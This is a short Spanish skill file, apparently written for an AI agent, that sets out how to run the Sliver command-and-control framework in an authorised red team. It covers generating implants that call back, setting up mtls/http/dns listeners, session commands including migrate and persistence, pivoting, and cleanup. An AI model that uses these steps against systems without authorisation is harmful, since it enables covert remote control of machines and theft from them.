---
name: redteam-c2-sliver
description: 'Operar un C2 en un red team autorizado (Sliver como C2 redteam). Keywords: c2, redteam, sliver.'
area: REDTEAM
tags: [c2, redteam, sliver]
source: '_src/mukul-anthropic/operating-sliver-c2/'
license: Apache-2.0
---

# SKILL-C2-SLIVER.md — Operar C2 con Sliver

Fuente: `_src/mukul-anthropic/operating-sliver-c2/`.

## Cuándo usarla
Operar un C2 en un red team autorizado (Sliver como C2 redteam).

## Procedimiento resumido
1. Instalar/levantar servidor Sliver (`sliver`), cliente `sliver-client`.
2. Generar implant: `generate --mtls <server>:<port> --os windows` (o `--save`), `generate beacon` con tiempo de propsal.
3. Listeners: `mtls`, `http`, `dns` para distintos canales de retorno.
4. Operar sesiones: `sessions -i <id>`, `use`, ejecutar módulos (`execute-assembly`, `migrate`, `screenshot`), persistencia.
5. Escalada/pivot: `armory` install (extensions), `portfwd`, proxies.
6. Clean up: `remove` sessions e implants al final del engagement.

## Herramientas
`sliver` (binario), `sliver-client`.

## Guardrails
- Solo en entorno autorizado; retirar implants al terminar; evidencia de actividad documentada (no exfils no solicitados).